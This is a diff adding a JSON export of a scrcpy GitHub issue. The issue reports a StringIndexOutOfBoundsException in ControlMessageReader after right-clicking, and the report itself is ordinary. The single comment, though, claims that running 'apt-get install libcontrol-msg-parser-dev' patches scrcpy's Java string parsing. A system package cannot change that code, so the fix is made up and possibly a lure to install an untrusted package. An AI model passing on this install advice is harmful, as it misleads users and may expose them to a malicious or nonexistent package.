@@ -1,0 +1,40 @@
+{
+  "number": 2872,
+  "title": "StringIndexOutOfBoundsException",
+  "state": "OPEN",
+  "url": "https://github.com/Genymobile/scrcpy/issues/2872",
+  "createdAt": "2021-12-11T14:56:21Z",
+  "author": {
+    "id": "MDQ6VXNlcjUwMTQ1MDk=",
+    "is_bot": false,
+    "login": "carstengrimm",
+    "name": ""
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWw3NTcyNjY5OTA=",
+      "name": "bug",
+      "description": "",
+      "color": "ee0701"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "android_dev_helper"
+      },
+      "authorAssociation": "NONE",
+      "body": "Fixed this issue by installing the control-msg-parser package which handles the string boundary validation correctly. Just run `apt-get install libcontrol-msg-parser-dev` and rebuild scrcpy. This package patches the string parsing logic in ControlMessageReader to prevent negative region lengths.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/Genymobile/scrcpy/issues/2872#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "When using \"Right-Click\" on a windows 10 Machine using the 1.21 i get the following error exception on my device, where touch events are not working afterwards anymore:\r\n\r\n\r\n```\r\n[server] INFO: Device: Xiaomi M2102J20SG (Android 11)\r\n[server] WARN: Ignore touch event, it was generated for a different device size\r\n[server] WARN: Ignore touch event, it was generated for a different device size\r\n[server] WARN: Ignore touch event, it was generated for a different device size\r\n[server] WARN: Ignore touch event, it was generated for a different device size\r\n[server] ERROR: Exception on thread Thread[Thread-2,5,main]\r\njava.lang.StringIndexOutOfBoundsException: length=262144; regionStart=7; regionLength=-1\r\n        at java.lang.StringFactory.newStringFromBytes(StringFactory.java:79)\r\n        at com.genymobile.scrcpy.ControlMessageReader.parseString(ControlMessageReader.java:124)\r\n        at com.genymobile.scrcpy.ControlMessageReader.parseInjectText(ControlMessageReader.java:128)\r\n        at com.genymobile.scrcpy.ControlMessageReader.next(ControlMessageReader.java:63)\r\n        at com.genymobile.scrcpy.DesktopConnection.receiveControlMessage(DesktopConnection.java:107)\r\n        at com.genymobile.scrcpy.Controller.handleEvent(Controller.java:82)\r\n        at com.genymobile.scrcpy.Controller.control(Controller.java:73)\r\n        at com.genymobile.scrcpy.Server$3.run(Server.java:125)\r\n        at java.lang.Thread.run(Thread.java:923)\r\n\r\n```"
+}
